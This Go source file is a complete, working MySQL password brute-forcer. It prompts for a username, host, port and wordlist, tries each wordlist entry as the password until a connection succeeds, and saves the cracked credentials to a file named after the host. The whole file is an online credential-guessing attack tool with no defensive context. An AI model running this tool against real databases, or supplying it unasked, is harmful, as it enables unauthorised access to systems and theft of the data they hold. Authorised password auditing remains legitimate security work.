package main

import (
	"bufio"
	"database/sql"
	"fmt"
	"github.com/AlecAivazis/survey/v2"
	_ "github.com/go-sql-driver/mysql"
	"log"
	"os"
)

func main() {
	var qs = []*survey.Question{
		{
			Name: "username",
			Prompt: &survey.Input{
				Message: "Please enter username for db:",
			},
			Validate: survey.Required,
		},
		{
			Name: "hostname",
			Prompt: &survey.Input{
				Message: "Please enter hostname:",
			},
			Validate: survey.Required,
		},
		{
			Name: "port",
			Prompt: &survey.Input{
				Message: "Please enter port number:",
			},
			Validate: survey.Required,
		},
		{
			Name: "wordlist",
			Prompt: &survey.Input{
				Message: "Please enter path to wordlist:",
			},
			Validate: survey.Required,
		},
	}

	answers := struct {
		Username string `survey:"username"`
		Hostname string `survey:"hostname"`
		Port     int    `survey:"port"`
		Wordlist string `survey:"wordlist"`
	}{}

	err := survey.Ask(qs, &answers)
	if err != nil {
		log.Fatal(err)
	}

	wordlist, err := readWordList(answers.Wordlist)
	if err != nil {
		log.Fatalln("error reading wordlist:", err)
	}

	for i, word := range wordlist {
		_, err := checkConnection(answers.Username, word, answers.Hostname, answers.Port)
		if err != nil {
			s := fmt.Sprintf("[FAIL %d/%d] %s:%s@%s:%d | Error: %s", i, len(wordlist), answers.Username, word, answers.Hostname, answers.Port, err.Error())
			log.Println(s)
		} else {
			s := fmt.Sprintf("[SUCCESS %d/%d] %s:%s@%s:%d", i, len(wordlist), answers.Username, word, answers.Hostname, answers.Port)
			os.WriteFile(answers.Hostname+".txt", []byte(s), 0755)
			log.Println(s)
			break
		}
	}

}

func checkConnection(user, password, host string, port int) (bool, error) {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s:%d)/", user, password, host, port))
	if err != nil {
		return false, err
	}
	defer db.Close()

	err = db.Ping()
	if err != nil {
		return false, err
	}

	return true, nil
}

func readWordList(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return lines, nil
}
